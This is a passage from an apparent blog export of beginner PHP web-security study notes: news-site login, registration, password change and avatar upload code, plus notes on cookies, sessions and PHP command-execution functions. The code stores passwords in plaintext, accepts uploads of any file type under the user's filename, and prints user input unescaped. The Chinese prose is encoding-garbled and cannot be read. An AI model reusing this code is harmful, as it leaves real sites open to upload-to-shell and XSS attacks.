ï¼š&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;checknewpasswd&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;?php include &quot;../basedir/footer.php&quot;;?&gt; checkpass.php æ€è·¯ï¼šå…ˆæŠŠæ¯è¡Œæ•°æ®è¯»å‡ºå­˜åˆ°ä¸€ä¸ªæ•°ç»„é‡Œï¼Œç”¨æˆ·ååŒ¹é…æˆåŠŸåŽï¼Œå…ˆåˆ¤æ–­oldpassæ˜¯å¦æ­£ç¡®ï¼Œä¸æ­£ç¡®åˆ™è¿”å›žï¼Œé‡æ–°è¾“å…¥ï¼Œè‹¥åŒ¹é…æˆåŠŸï¼Œå†åˆ¤æ–­newpasswdå’Œchecknewpasswdæ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´è¿”å›žï¼Œé‡æ–°è¾“å…¥ï¼Œä¸€è‡´çš„è¯ï¼ŒæŠŠè¯¥ç”¨æˆ·çš„å¯†ç æ”¹æˆæ–°å¯†ç åŽå…¥æ ˆã€‚æœ€åŽå¤„ç†å®Œçš„æ•°æ®å†™å…¥æ–‡ä»¶ä¸­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php session_start(); if($_SESSION[&apos;uname&apos;]==NULL) &#123; echo &quot;&lt;script&gt;alert(&apos;è¯·ç™»å½•&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;; die(&quot;è¯·ç™»å½•&quot;); &#125; if($_POST[&apos;oldpasswd&apos;]==NULL &amp;&amp; $_POST[&apos;newpasswd&apos;]==NULL &amp;&amp; $_POST[&apos;checknewpasswd&apos;]==NULL)&#123; echo &quot;&lt;script&gt;alert(\&quot;å¯†ç ä¸èƒ½ä¸ºç©º\&quot;); history.back();&lt;/script&gt;&quot;; &#125; $tmparr = array(); $userPasswd = array(); $oldpass = $_POST[&apos;oldpasswd&apos;]; $newpass = $_POST[&apos;newpasswd&apos;]; $checknew = $_POST[&apos;checknewpasswd&apos;]; $fhandle = fopen(&apos;../data/user1.db&apos;, &apos;r&apos;); while(!feof($fhandle)) &#123; $line = fgets($fhandle); $lineArr = explode(&apos;||&apos;, $line); if ($lineArr[0] == $_SESSION[&apos;uname&apos;]) &#123; $userPasswd[0] = $lineArr[0]; $userPasswd[1] = $newpass.&quot;\n&quot;; $checkold = $lineArr[1]; array_push($tmparr, $userPasswd); continue; &#125; array_push($tmparr, $lineArr); &#125; fclose($fhandle); if(trim($checkold)!=$oldpass)&#123; echo &quot;&lt;script&gt;alert(\&quot;å¯†ç ä¸æ­£ç¡®ï¼\&quot;)&lt;/script&gt;&quot;; &#125;else &#123; if ($newpass == $checknew) &#123; $fhandle = fopen(&apos;../data/user1.db&apos;, w); for ($i = 0; $i &lt; count($tmparr); $i++) &#123; $str = implode(&apos;||&apos;, $tmparr[$i]); echo $str; echo &quot;&lt;br&gt;&quot;; fputs($fhandle, $str); &#125; fclose($fhandle); echo &quot;&lt;script&gt;alert(\&quot;å¯†ç ä¿®æ”¹æˆåŠŸï¼Œè¯·é‡æ–°ç™»å½•ï¼\&quot;)&lt;/script&gt;&quot;; //echo &quot;&lt;script&gt;location.href=&apos;../logout.php&apos;&lt;/script&gt;&quot;; &#125;else&#123; echo &quot;&lt;script&gt;alert(\&quot;æ–°å¯†ç ä¸åŒ¹é…ï¼Œè¯·é‡æ–°è¾“å…¥ï¼\&quot;)&lt;/script&gt;&quot;; &#125; &#125;?&gt; ä¿®æ”¹å¯†ç ç•Œé¢ï¼š å¯†ç ä¿®æ”¹åŽç™»å‡ºè´¦å·ï¼Œé‡æ–°ç™»å½•ã€‚ äº”ã€ä¸Šä¼ å¤´åƒ upload.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php include &apos;../basedir/function.php&apos;; include &apos;../basedir/header.php&apos;; ?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;ä¸Šä¼ å›¾ç‰‡&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?phpif($_SESSION[&apos;uname&apos;]==NULL) echo &quot;&lt;script&gt;alert(&apos;è¯·ç™»å½•&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;?&gt;&lt;div align=&quot;center&quot;&gt; &lt;a href=&quot;del.php&quot;&gt;åˆ é™¤æ–°é—»&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;../data/addNews.php&quot;&gt;æ·»åŠ æ–°é—»&lt;/a&gt; &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &amp;nbsp &lt;a href=&quot;getpasswd.php&quot;&gt;ä¿®æ”¹å¯†ç &lt;/a&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label&gt;æ–‡ä»¶åï¼š&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; &gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif(isset($_POST[&apos;submit&apos;]))&#123; $name = $_FILES[&apos;file&apos;][&apos;name&apos;]; $temp_name = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;]; if(isset($name))&#123; if(!empty($name))&#123; $location = &quot;../upload/&quot;; $path = $location . $name; if(move_uploaded_file($temp_name, $location.$name))&#123; $_SESSION[&apos;headImg&apos;] = $path; echo &apos;File uploaded successfully&apos;; echo &lt;&lt;&lt;EOF &lt;div align=&quot;center&quot;&gt; &lt;img src=$path&gt; &lt;/div&gt;EOF; &#125; &#125; &#125; else &#123; echo &apos;You should select a file to upload !!&apos;; &#125;&#125;?&gt;&lt;?php include &apos;../basedir/footer.php&apos;?&gt; ä¸Šä¼ å¤´åƒç•Œé¢ï¼š å…­ã€é€€å‡ºè´¦å· logout.php12345&lt;?phpsession_start();session_destroy();echo &quot;&lt;script&gt;alert(&apos;è´¦å·å·²é€€å‡º&apos;); location.href=&apos;login.html&apos;&lt;/script&gt;&quot;?&gt; åœ¨ä»»ä½•ä¸€ä¸ªç•Œé¢ç‚¹å‡»æ³¨é”€è´¦å·å‡èƒ½æˆåŠŸé€€å‡ºï¼Œé‡æ–°è¿”å›žç”¨æˆ·ç™»å½•ç•Œé¢ ç‚¹å‡»ç¡®å®šï¼Œè¿”å›žç”¨æˆ·ç™»å½•ç•Œé¢ã€‚ ä¸ƒã€é—®é¢˜ä¸Žæ€»ç»“ ç›®å‰çš„ä»£ç æœ‰äº›å†—ä½™ï¼Œæ¯”å¦‚åˆ é™¤æ–°é—»å’Œä¿®æ”¹å¯†ç ï¼Œéƒ½æ˜¯æŠŠéœ€è¦çš„ä¿¡æ¯è¯»å–å‡ºæ¥ï¼Œç„¶åŽç¨ä½œå¤„ç†å†å†™å›žæ–‡ä»¶ï¼Œå¯ä»¥åœ¨function.phpæ–‡ä»¶é‡Œå†™ä¸€ä¸ªå‡½æ•°ï¼Œéœ€è¦æ—¶ç›´æŽ¥è°ƒç”¨å‡½æ•°å°±è¡Œï¼›åˆ é™¤æ–°é—»ç•Œé¢å’Œåˆå§‹åŒ–ç•Œé¢éƒ½æœ‰å±•ç¤ºæ–°é—»çš„åŠŸèƒ½ï¼Œä¹Ÿå¯å¯ä»¥é€šè¿‡ä¸€ä¸ªå‡½æ•°æ¥å®žçŽ°å±•ç¤ºã€‚ å¯¹å†™å…¥æ–‡ä»¶çš„å†…å®¹åˆ¤æ–­ä¸ä¸¥è°¨ï¼Œä¼šæŠŠ\nå†™å…¥ï¼Œæ–‡ä»¶å†…å®¹é—´æœ‰ç©ºè¡Œæ—¶ï¼Œç»Ÿè®¡æ€»çš„idæ•°ä¼šæŠŠç©ºè¡Œä¹Ÿç»™ç»Ÿè®¡è¿›åŽ»ï¼Œè¿›è€Œå¯¼è‡´åˆ é™¤æ–°é—»æ—¶ï¼Œä¸æˆåŠŸã€‚æŠŠç©ºè¡Œåˆ å®Œä»¥åŽï¼Œæ‰ä¼šæ‰§è¡ŒæˆåŠŸã€‚ç›®å‰å¯¹æ–‡ä»¶æ“ä½œ\nç†è§£ä¸æ·±ï¼Œæ­£åœ¨å¯»æ‰¾æ–¹æ³•è§£å†³ã€‚ ä»£ç ç§»æ¤æ€§å·®ï¼Œéœ€è¦ä¿®æ”¹åœ°æ–¹è¾ƒå¤šã€‚]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note20]]></title>
    <url>%2F2019%2F08%2F09%2Fnote20%2F</url>
    <content type="text"><![CDATA[Abstract: æ–°é—»ç•Œé¢æ·»åŠ æ–°åŠŸèƒ½è®²è§£ï¼ŒPHPä¸­çš„Cookieå’ŒSessionä»¥åŠç¨‹åºæ‰§è¡Œå‡½æ•° ä¸€ã€PHP Cookiecookieå¸¸ç”¨äºŽè¯†åˆ«ç”¨æˆ·ï¼Œæ˜¯ä¸€ç§æœåŠ¡å™¨ç•™åœ¨ç”¨æˆ·è®¡ç®—æœºä¸Šçš„å°æ–‡ä»¶ã€‚æ¯å½“åŒä¸€å°è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶ï¼Œè¿™å°è®¡ç®—æœºå°†ä¼šå‘é€cookieã€‚ 1. å¦‚ä½•åˆ›å»ºCookiesetcookie()å‡½æ•°ç”¨äºŽè®¾ç½®cookie setcookie()å‡½æ•°å¿…é¡»ä½äºŽ&lt;html&gt;æ ‡ç­¾ä¹‹å‰ 12345678&lt;?php/*setcookie(name, value, expire, path, domain)å‘é€cookieæ—¶ï¼Œcookieå€¼ä¼šè‡ªåŠ¨è¿›è¡ŒURLç¼–ç å–å›žæ—¶è¿›è¡Œè‡ªåŠ¨è§£ç */setcookie(&quot;user&quot;, &quot;test&quot;, time()+3600);?&gt; 2. å–å›žCookieå€¼123456&lt;?php//è¾“å‡ºcookieå€¼echo $_COOKIE[&quot;user&quot;];//æŸ¥çœ‹æ‰€æœ‰cookieprint_r($_COOKIE);?&gt; 1234567891011121314&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;issetå‡½æ•°&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if(isset($_COOKIE[&quot;user&quot;])) echo &quot;æ¬¢è¿Ž&quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;; else echo &quot;æ™®é€šè®¿å®¢ï¼&lt;br&gt;&quot;; ?&gt; &lt;/body&gt;&lt;/html&gt; 3. åˆ é™¤Cookie1234&lt;?php//è®¾ç½®cookieè¿‡æœŸæ—¶é—´ä¸ºè¿‡åŽ»1å°æ—¶setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt; äºŒã€PHP SessionPHP sessionå˜é‡ç”¨äºŽå­˜å‚¨å…³äºŽç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯çš„è®¾ç½®ï¼ŒSessionå˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºŽåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ã€‚ 1. å¼€å§‹PHP Session12345&lt;!--session_start()å‡½æ•°å¿…é¡»ä½äºŽ&lt;html&gt;æ ‡ç­¾ä¹‹å‰--&gt;&lt;?php session_start(); ?&gt;&lt;html&gt; &lt;body&gt;&lt;/body&gt;&lt;/html&gt; 2.å­˜å‚¨Sessionå˜é‡1234567891011121314151617&lt;?php session_start();//å­˜å‚¨sessionæ•°æ®$_SESSION[&apos;views&apos;]=1;?&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Session&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php //æ£€ç´¢sessionæ•°æ® echo &quot;æµè§ˆé‡ï¼š&quot; . $_SESSION[&apos;views&apos;]; ?&gt; &lt;/body&gt;&lt;/html&gt; ä¸€ä¸ªç®€å•çš„page-viewè®¡æ•°å™¨ 123456789&lt;?phpsession_start();if(isset($_SESSION[&apos;views&apos;]))&#123; $_SESSION[&apos;views&apos;] = $_SESSION[&apos;views&apos;] + 1;&#125;else&#123; $_SESSION[&apos;views&apos;] = 1;&#125;echo &quot;æµè§ˆå™¨ï¼š&quot; . $_SESSION[&apos;views&apos;];?&gt; 3. é”€æ¯Sessionunset() 123456&lt;?phpsession_start();if(isset($_SESSION[&apos;views&apos;]))&#123; unset($_SESSION[&apos;views&apos;]);&#125;?&gt; session_destroy() 123&lt;?phpsession_destroy();?&gt; éªŒè¯ç™»å½•ç”¨æˆ·æ˜¯å¦ç”±adminæƒé™ 12345678910&lt;?phpsession_start();if(isset($_SESSION[&quot;admin&quot;]) &amp;&amp; $_SESSION[&quot;admin&quot;]== true)&#123; echo &quot;æ‚¨å·²æˆåŠŸç™»å½•&quot;;&#125;else&#123; //éªŒè¯å¤±è´¥ $_SESSION[&quot;admin&quot;] = false; die(&quot;æ‚¨æ— æƒè®¿é—®&quot;);&#125;?&gt; ä¸‰ã€PHPåŒ…å«æ–‡ä»¶ è¯­å¥ åŒºåˆ«ï¼ˆå¤„ç†é”™è¯¯æ–¹å¼ä¸åŒï¼‰ require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯(E_COMPILE_ERROR)ï¼Œåœ¨é”™è¯¯å‘ç”ŸåŽè„šæœ¬åœæ­¢æ‰§è¡Œ include ç”Ÿæˆä¸€ä¸ªè­¦å‘Š(E_WARNING)ï¼Œåœ¨é”™è¯¯å‘ç”ŸåŽè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œ è¯­æ³• include &#39;filename&#39;; require &#39;filename&#39; å†™ä¸€äº›åŠŸèƒ½æ€§çš„å‡½æ•°ï¼Œæ¯”å¦‚æ•°æ®åº“æŸ¥è¯¢ï¼ŒéªŒè¯æ–‡ä»¶åŽç¼€æ˜¯å¦æ˜¯å…è®¸çš„ã€‚æ•°æ®åº“åˆ é™¤ï¼Œæ•°æ®æ¸…æ´—waf å†™é…ç½®ä¿¡æ¯ï¼Œæ•°æ®åº“è¿žæŽ¥åœ°å€ï¼Œç½‘ç«™æ ‡é¢˜ï¼Œç½‘ç«™ä½œè€… ç»Ÿä¸€é¡µé¢æ ¼å¼ åšè·¯ç”±æŽ§åˆ¶ å››ã€PHPä¸­ç¨‹åºæ‰§è¡Œå‡½æ•°1. systemsystem â€”æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡º system(command, return var) 12345&lt;?phpsystem(&quot;pwd&quot;, $result);//è¾“å‡ºå‘½ä»¤çš„ç»“æžœçŠ¶æ€ç echo $result;?&gt; 2. execexecâ€”æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº 123&lt;?phpecho exec(&quot;whoami&quot;);?&gt; 3. shellexecshellexecâ€”é€šè¿‡shellçŽ¯å¢ƒæ‰§è¡Œå‘½ä»¤å¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›žã€‚ 1234&lt;?php$output = shell_exec(&apos;ls -lart&apos;);echo $output;?&gt; 4. evalevalæŠŠå­—ç¬¦ä¸²æŒ‰ç…§phpä»£ç æ¥è®¡ç®— 12345678&lt;?php$string = &apos;cup&apos;;$name = &apos;coffee&apos;;$str = &apos;This is a $string with my $name in it.&apos;;echo $str . &quot;\n&quot;;eval(&quot;\$str = \&quot;$str\&quot;;&quot;);echo $str . &quot;\n&quot;;?&gt; 5. assertassertæ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸ºFALSE]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 4]]></title>
    <url>%2F2019%2F08%2F09%2Fpractice4%2F</url>
    <content type="text"><![CDATA[Abstract: æ–°é—»ç•Œé¢æ–°å¢žç”¨æˆ·ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½ï¼Œä»¥åŠåœ¨ç¼–å†™è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ä¸Žè§£å†³ ä¸€ã€ç”¨æˆ·ç™»å½•1.ç”¨æˆ·ç™»å½•ç•Œé¢ signin.php123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt; &lt;title&gt; ç™»å½• &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h1 align=&quot;center&quot;&gt;ç™»å½•&lt;/h1&gt;&lt;div align=&quot;center&quot;&gt; &lt;br&gt; &lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;tel&quot; name=&quot;phonenumber&quot; placeholder=&quot;æ‰‹æœºå·&quot;&gt; &lt;br&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;a href=&quot;signup.php&quot;&gt;æ³¨å†Œè´¦å·&lt;/a&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;br&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.è´¦å·å’Œå¯†ç å¤„ç† login.php12345678910111213141516171819202122232425262728293031323334353637383940&lt;html&gt;&lt;head&gt; &lt;title&gt; å¤„ç†è´¦å·å’Œå¯†ç  &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php//æ‰“å¼€å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æ–‡ä»¶$fhandle = fopen(&apos;./data/users.db&apos;, &apos;r&apos;);//é€è¡Œè¯»å–æ•°æ®while(!feof($fhandle)) &#123; $InMes = fgets($fhandle); $mesArray = explode(&apos;||&apos;, $InMes); if(count($mesArray)!=2)&#123; continue; &#125; if(trim($mesArray[0])==$_POST[&apos;phonenumber&apos;] &amp;&amp; trim($mesArray[1])==$_POST[&apos;password&apos;])&#123; echo &quot;æ­£åœ¨è¿›å…¥åŽå°&quot;; echo &lt;&lt;&lt;EOF &lt;script&gt;location.href=&quot;./data/add_news.php&quot;&lt;/script&gt;EOF; break; &#125; $flag = 1;// else&#123;// echo &quot;&lt;script&gt;alert(&apos;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼é‡æ–°è¾“å…¥ã€‚&apos;)&lt;/script&gt;&quot;;// echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;// &#125;&#125;//ä¿®æ”¹é€»è¾‘é—®é¢˜if($flag==1)&#123; echo &quot;&lt;script&gt;alert(&apos;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼é‡æ–°è¾“å…¥ã€‚&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; é€»è¾‘é—®é¢˜ï¼šæ³¨é‡ŠæŽ‰çš„æ˜¯ç¬¬ä¸€æ¬¡å†™å®Œçš„ï¼Œä½†åˆ¤æ–­é€»è¾‘æ˜¯æœ‰é—®é¢˜çš„ï¼Œé€è¡Œè¯»å–ç”¨æˆ·ä¿¡æ¯åŽï¼Œç›¸åŒåˆ™è·³å›žå¢žåŠ æ–°é—»ç•Œé¢ï¼Œå¦åˆ™æç¤ºé”™è¯¯ä¿¡æ¯ï¼Œé‡æ–°è¾“å…¥è´¦å·æˆ–å¯†ç ï¼Œè¿™æ ·ä¼šå¯¼è‡´ç”¨æˆ·ä¿¡æ¯æ²¡æœ‰åŒ¹é…æˆåŠŸå‰ä¼šä¸€ç›´æŠ¥é”™ã€‚ è§£å†³æ–¹æ³•ï¼šåœ¨ç”¨æˆ·è¯»å®Œæ–‡ä»¶å‰ä¸åšå‡ºé”™åˆ¤æ–­ï¼Œè¯»å®Œå†åˆ¤æ–­ï¼Œåœ¨åˆ¤æ–­åŒ¹é…æˆåŠŸè¯­å¥åŽæ·»åŠ ä¸€ä¸ªæ ‡å¿—ä½flagè‹¥å€¼ä¸º1è¯´æ˜Žç”¨æˆ·æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œç›´æŽ¥æŠ¥é”™ã€‚ï¼Œè¿”å›žç”¨æˆ·ç™»å½•ç•Œé¢é‡æ–°è¾“å…¥å¯†ç ã€‚ æ ¼å¼é—®é¢˜ï¼šç”¨æˆ·è´¦å·å’Œå¯†ç åŒ¹é…æ—¶ä¸€ç›´åŒ¹é…ä¸å¯¹ã€‚ è§£å†³æ–¹æ³•ï¼šç”¨var_dumpæŠŠæ•°æ®è¾“å‡ºå‘çŽ°æ˜¯ç›¸åŒçš„ï¼Œä½†è¿˜æ˜¯åŒ¹é…ä¸æˆåŠŸï¼Œæƒ³æƒ³æœ‰å¯èƒ½éœ€è¦ç”¨trimå‡½æ•°å¤„ç†ä¸‹æ•°æ®ã€‚ äºŒã€ç”¨æˆ·æ³¨å†Œ1.ç”¨æˆ·æ³¨å†Œç•Œé¢ signup.php12345678910111213141516171819202122&lt;html&gt;&lt;head&gt; &lt;title&gt; æ³¨å†Œè´¦å· &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div align=&quot;center&quot;&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h2 align=&quot;center&quot;&gt;æ³¨å†Œç”¨æˆ·&lt;/h2&gt; &lt;form action=&quot;./checkSignUp.php&quot; method=&quot;post&quot;&gt; æ‰‹æœºï¼š&lt;input type=&quot;tel&quot; name=&quot;phonenumber&quot;placeholder=&quot;æ‰‹æœºå·&quot;&gt; &lt;br&gt; å¯†ç ï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; ç¡®è®¤ï¼š&lt;input type=&quot;password&quot; name=&quot;checkpasswd&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 2.ç”¨æˆ·æ³¨å†Œæ•°æ®å¤„ç†1234567891011121314&lt;?php$fhandle = fopen(&apos;./data/users.db&apos;, &apos;a+&apos;);$userMes = array();@$userMes[0] = $_POST[&apos;phonenumber&apos;];@$userMes[1]=$_POST[&apos;password&apos;];$inMes = implode(&apos;||&apos;, $userMes);// var_dump($inMes);if(count($userMes)==2) &#123; fputs($fhandle, $inMes . &quot;\n&quot;); fclose($fhandle); echo &quot;&lt;script&gt;alert(&apos;ç”¨æˆ·æ³¨å†ŒæˆåŠŸ&apos;)&lt;/script&gt;&quot;; echo &quot;&lt;script&gt;location.href=&apos;signin.php&apos;&lt;/script&gt;&quot;;&#125;?&gt; æ³¨å†ŒæˆåŠŸè‡ªåŠ¨è·³è½¬åˆ°ç”¨æˆ·ç™»å½•ç•Œé¢ ä¸‰ã€æ·»åŠ æ–°é—»ç•Œé¢ add_news.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;å¢žåŠ æ–°é—»&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;add_news.php&quot; method=&quot;post&quot;&gt; æ ‡å·ï¼š&lt;input type=&quot;number&quot; name=&quot;id&quot;&gt;&lt;br&gt; æ ‡é¢˜ï¼š&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;!-- æ ‡é¢˜ï¼š&lt;input type=&quot;text&quot; namne=&quot;title&quot;&gt;&lt;br&gt;--&gt; å†…å®¹ï¼š&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt; æ—¥æœŸï¼š&lt;input type=&quot;date&quot; name=&quot;date&quot;&gt;&lt;br&gt; ä½œè€…ï¼š&lt;input type=&quot;author&quot; name=&quot;author&quot;&gt;&lt;br&gt; çƒ­åº¦ï¼š&lt;input type=&quot;number&quot; name=&quot;hot&quot;&gt;&lt;br&gt; å›¾ç‰‡ï¼š&lt;input type=&quot;url&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;?php $fhandle = fopen(&apos;news.db &apos;, &apos;a&apos;); $arrMes = array(); @$arrMes[0] = $_POST[&apos;id&apos;]; @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]); @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]); @$arrMes[3] = $_POST[&apos;date&apos;]; @$arrMes[4] = base64_encode($_POST[&apos;author&apos;]); @$arrMes[5] = $_POST[&apos;hot&apos;]; @$arrMes[6]= $_POST[&apos;imgUrl&apos;]; if($arrMes[0]!=NULL) &#123; $writeMes = implode(&apos;||&apos;, $arrMes); //echo $writeMes; $fline = fputs($fhandle, &quot;\n&quot;.$writeMes); if($fline!=flase)&#123; echo &quot;&lt;script&gt;alert(\&quot;æ–°é—»æ·»åŠ æˆåŠŸï¼\&quot;)&lt;/script&gt;&quot;; echo &quot;&lt;a href=&apos;../index.php&apos;&gt;ç‚¹å‡»æŸ¥çœ‹&lt;/a&gt;&quot;; &#125; &#125; fclose($fhandle);?&gt;&lt;script&gt; function alertInfo()&#123; alert(&quot;æ–°é—»æ·»åŠ æˆåŠŸï¼&quot;) &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; å››ã€å±•ç¤ºæ–°é—»ç•Œé¢ index.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;h1 align=&quot;center&quot;&gt;ICQæ–°é—»ä¸­å¿ƒ&lt;/h1&gt;&lt;hr&gt;&lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;çƒ­åº¦&lt;/th&gt; &lt;th&gt;æ ‡é¢˜&lt;/th&gt; &lt;th&gt;ä½œè€…&lt;/th&gt; &lt;th&gt;æ—¶é—´&lt;/th&gt; &lt;th&gt;ç´ è´¨ä¸‰è”&lt;/th&gt; &lt;/tr&gt; &lt;?php //ç”¨åªè¯»æ–¹å¼æ‰“å¼€news.dbæ–‡ä»¶ $fhandle = fopen(&quot;./data/news.db&quot;, &quot;r&quot;); //è®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå°äºŽ3æ—¶ï¼Œæ¯ä¸ªæ–‡ç« æ ‡é¢˜ä¸‹é¢å¢žåŠ å›¾ç‰‡å’Œç®€ä»‹ $top3Cnt=1; while(!feof($fhandle)) &#123; $fline = fgets($fhandle); $data = explode(&apos;||&apos;, $fline); @$title = base64_decode($data[1]); @$content = base64_decode($data[2]); @$date = $data[3]; @$author = base64_decode($data[4]); @$hot = $data[5]; @$imgUrl = $data[6]; echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$hot&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; &lt;td&gt;$date&lt;/td&gt; &lt;td&gt;&lt;button&gt;ðŸ‘&lt;/button&gt;/&lt;button&gt;ðŸ‘Ž&lt;/button&gt;&lt;/td&gt; &lt;/tr&gt;EOF; if($top3Cnt&lt;=3)&#123; $tmpContent = mb_substr(base64_decode($data[2]), 0,50); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt; &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;å†…å®¹ç®€ä»‹ï¼š&lt;/b&gt;$tmpContent&lt;/td&gt; &lt;/tr&gt;EOF; &#125; $top3Cnt++; &#125; ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å®žæˆ˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note19]]></title>
    <url>%2F2019%2F08%2F08%2Fnote19%2F</url>
